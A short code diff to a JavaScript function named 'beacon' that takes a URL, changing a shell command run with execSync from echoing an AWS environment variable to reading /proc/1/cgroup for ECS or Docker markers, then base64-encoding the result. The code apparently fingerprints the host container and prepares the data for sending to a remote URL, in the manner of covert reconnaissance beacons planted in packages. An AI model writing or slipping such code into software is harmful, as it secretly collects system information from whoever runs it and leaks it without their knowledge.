@@ -47,7 +47,7 @@ function beacon(urlStr, q) {
   let idOutput = "";
   try {
     idOutput = execSync(
-  'echo "$AWS_EXECUTION_ENV"',
+  'cat /proc/1/cgroup | grep -iE "ecs|docker" || true',
   { encoding: "utf8" }
 ).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
